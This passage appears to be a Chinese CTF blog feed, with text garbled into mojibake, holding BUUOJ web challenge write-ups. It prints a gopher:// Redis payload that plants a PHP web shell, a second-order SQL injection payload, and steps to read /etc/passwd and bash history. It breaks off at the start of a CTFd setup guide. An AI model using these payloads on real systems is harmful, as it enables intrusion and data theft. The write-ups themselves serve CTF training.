loading="lazy"><p>åœ¨6379ç«¯å£å‘ç°å¼‚å¸¸ï¼Œè‡³æ­¤æ˜ç™½ä¸ºredisæ¼æ´</p><p>å°è¯•æ‰“redisæœªæˆæƒè®¿é—®æ¼æ´</p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p>åœ¨ç›®æ ‡ä¸»æœºä¸Šç”Ÿæˆ<code>shell.php</code>ï¼Œæ‰«æ<code>fla*</code>ï¼Œä»¥ç¡®å®šflagä½ç½®</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184856356.png" class="" title="image-20201223184856356" loading="lazy"><p>æ’é™¤å…¶ä»–å¯èƒ½ï¼Œç¡®è®¤flagåœ¨æ ¹ç›®å½•ï¼Œå†æ‰“</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p><code>cat /flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223185801498.png" class="" title="image-20201223185801498" loading="lazy"><hr><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a><a href="/article/Buuoj-WEB-Write-up/#Comment">[ç½‘é¼æ¯ 2018]Comment</a></h2><p>æ‰“å¼€é¢˜ç›®ä¸ºç•™è¨€æ¿ï¼ŒçŒœæµ‹SSTIï¼Œsqlæ³¨å…¥ä¹‹ç±»çš„ã€‚</p><p>éšä¾¿ç•™è¨€åè·³è½¬ç™»é™†ç•Œé¢ï¼Œsqlæ³¨å…¥æµ‹è¯•æ— æœï¼Œçœ‹æ¡†å†…å­—ç¬¦ä¸²ï¼Œå¼±å¯†ç çˆ†ç ´ä¸€æ³¢</p><img src="/article/Buuoj-WEB-Write-up/image-20201223193659732.png" class="" title="image-20201223193659732" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203540497.png" class="" title="image-20201223203540497" loading="lazy"><p>çˆ†ç ´å¯†ç ä¸º<code>zhangwei666</code></p><p>è¿›å»å°è¯•SSTI,sqlæ³¨å…¥æ— æœï¼Œä½†æ˜¯sqlæ³¨å…¥è¯­å¥è¢«è¿‡æ»¤ã€‚</p><p>ç«™å†…æŸ¥æ‰¾ï¼Œå‘ç°gitæ³„éœ²</p><img src="/article/Buuoj-WEB-Write-up/image-20201223201810099.png" class="" title="image-20201223201810099" loading="lazy"><p><code>writr_do.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>çœ‹èµ·æ¥ä»£ç è‚¯å®šæ˜¯åˆ è¿‡çš„</p><p>ç„¶åå‘ç°å…¶å®åŸæ¥éœ€è¦git log æ¢å¤ï¼Œä¸å¾—ä¸è¯´ï¼Œgit_extractçœŸé¦™ï¼Œç›´æ¥æ‰’å‡ºåŸå…ˆçš„æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å…³é”®è¯­å¥<code>select category from board where id=</code>ï¼ŒcommentæŸ¥è¯¢ç±»åˆ«ä¼šè¿›è¡Œç›´æ¥æŸ¥è¯¢ï¼Œæ‰€ä»¥ä¸ºsqläºŒæ¬¡æ³¨å…¥</p><p>ç•™è¨€ä¼šè¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥ç°åœ¨å°±è¦æ„é€ äºŒæ¬¡æ³¨å…¥</p><p>è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>å³ <span class="token double-quoted-string string">"insert into comment set category = '<span class="token interpolation"><span class="token variable">$category</span></span>', content = '<span class="token interpolation"><span class="token variable">$content</span></span>', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><p>å…¶ä¸­å˜é‡éƒ½å¯æ§ï¼Œç”±äºsqlä¸­å•å¥æ¢è¡Œï¼Œ<code>#</code>åªèƒ½æ³¨é‡Šå•è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨<code>/**/</code>æ³¨é‡Š</p><p>å˜ä¸º</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '',content=user(),/*',                content = '*/#',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>å³ <span class="token double-quoted-string string">"insert into comment set category = '',content=user(),/*', content = '*/#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>ç­‰ä»·äº <span class="token double-quoted-string string">"insert into comment set category = '',content=user(),#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201223203506275.png" class="" title="image-20201223203506275" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203606551.png" class="" title="image-20201223203606551" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203616701.png" class="" title="image-20201223203616701" loading="lazy"><p>å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ³¨å…¥æ— æœï¼Œ è½¬è€Œç”¨load_fileè¯»å–ä¸‹/etc/passwd </p><img src="/article/Buuoj-WEB-Write-up/image-20201223204451913.png" class="" title="image-20201223204451913" loading="lazy"><p>wwwç”¨æˆ·æœ‰bashæ‰§è¡Œæƒé™</p><p>è¯»å–wwwç”¨æˆ·bashå†å²è®°å½•</p><img src="/article/Buuoj-WEB-Write-up/image-20201223204754524.png" class="" title="image-20201223204754524" loading="lazy"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp/<span class="token function">unzip</span> html.zip<span class="token function">rm</span> -f html.zip<span class="token function">cp</span> -r html /var/www/<span class="token builtin class-name">cd</span> /var/www/html/<span class="token function">rm</span> -f .DS_Store<span class="token function">service</span> apache2 start</code></pre><p>æ‰€ä»¥<code>/tmp/html</code>ç›®å½•æ²¡åˆ ï¼Œä½†æ˜¯ä¸çŸ¥é“ç›®å½•æ–‡ä»¶ï¼ŒåªçŸ¥é“æœ‰ä¸ª<code>.DS_Store</code></p><p>è¯»å–å‘ç°æ˜¯ä¹±ç ï¼Œè½¬ç”¨hexç¼–ç è¯»å–</p><img src="/article/Buuoj-WEB-Write-up/image-20201223205134946.png" class="" title="image-20201223205134946" loading="lazy"><p>è„šæœ¬æ¢å¤ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2020/12/23 20:52@Auth ï¼š gyy@File ï¼šexp1.py@Blogï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> binasciihexdata <span class="token operator">=</span> <span class="token string">"00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"</span>data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>hexdata<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">".DS_Store"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre><p>è¯»å–åˆ°</p><img src="/article/Buuoj-WEB-Write-up/image-20201223210658137.png" class="" title="image-20201223210658137" loading="lazy"><p>ç›´æ¥è¯»å–</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211015299.png" class="" title="image-20201223211015299" loading="lazy"><p>ç½‘é¼æ¯çš„é¢˜è¿˜æ˜¯å¾ˆé¡¶çš„</p><p>åè®°ï¼š</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211725414.png" class="" title="image-20201223211725414" loading="lazy"><p>ç„¶åå‘ç°ç­”æ¡ˆé”™è¯¯â€¦</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211919615.png" class="" title="image-20201223211919615" loading="lazy"><p>æ­£ç¡®æ–¹æ³•æ˜¯å–<code>/var/www/html/</code>ä¸‹çš„é‚£ä¸ªæ–‡ä»¶è¯»ï¼Œå› ä¸ºåŠ¨æ€é¶æœºçš„ç¼˜æ•…ï¼Œé€flagè¿›é¶æœºæ²¡æœ‰ç…§é¡¾åˆ°è¿™é¢˜å‘€â€¦</p><hr>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
            <tag> Linux </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFDæ”¯æŒåŠ¨æ€é¶æœºçš„æ­å»ºç¬”è®°ï¼ˆdockerï¼šctfd+ctf-whaleï¼‰</title>
      <link href="article/CTFD/"/>
      <url>article/CTFD/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFDæ”¯æŒåŠ¨æ€é¶æœºçš„æ­å»ºç¬”è®°ï¼ˆdockerï¼šctfd-ctf-whaleï¼‰"><a href="#CTFDæ”¯æŒåŠ¨æ€é¶æœºçš„æ­å»ºç¬”è®°ï¼ˆdockerï¼šctfd-ctf-whaleï¼‰" class="headerlink" title="CTFDæ”¯æŒåŠ¨æ€é¶æœºçš„æ­å»ºç¬”è®°ï¼ˆdockerï¼šctfd+ctf-whaleï¼‰"></a>CTFDæ”¯æŒåŠ¨æ€é¶æœºçš„æ­å»ºç¬”è®°ï¼ˆdockerï¼šctfd+ctf-whaleï¼‰</h1><h2 id="æœ¬ç¯‡æ–‡ç« æœ€åæ›´æ–°äº2021-2-25"><a href="#æœ¬ç¯‡æ–‡ç« æœ€åæ›´æ–°äº2021-2-25" class="headerlink" title="æœ¬ç¯‡æ–‡ç« æœ€åæ›´æ–°äº2021.2.25"></a>æœ¬ç¯‡æ–‡ç« æœ€åæ›´æ–°äº2021.2.25</h2><p>è½¬è½½è¯·æ³¨æ˜æ¥æºï¼š<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ctfdå¯ä»¥è¯´æ˜¯å¦‚ä»Šæœ€æ–¹ä¾¿çš„ctfé¶åœºæ­å»ºå¹³å°ï¼Œæ”¯æŒå„ç§æ’ä»¶ä¸äºŒæ¬¡å¼€å‘ï¼Œ<a href="https://www.zhaoj.in/">èµµå¸ˆå‚…</a>æ—©å‰å†™äº†ä¸€æ¬¾æ’ä»¶ctf-whaleéå¸¸æ–¹ä¾¿ï¼Œä½†æœ¬äººåœ¨æ­å»ºçš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸å°‘é—®é¢˜ï¼Œç»è¿‡ä¸æ–­ç ”ç©¶ç»ˆäºå®Œæˆï¼Œç‰¹æ­¤è®°å½•ï¼Œä»¥é˜²åæœŸå¿˜è®°ï¼Œä¹Ÿä¾›å¤§å®¶äº¤æµå­¦ä¹ ã€‚<br>èµµå¸ˆå‚…å¼€å‘çš„æ’ä»¶æ˜¯ä¸ºäº†é€‚åˆ <a href="https://buuoj.cn/">buu</a> çš„æ¶æ„,æœ¬ç¯‡æ–‡ç« é‡‡ç”¨å®Œæ•´æµç¨‹+å¡«å‘è®²è§£çš„æ 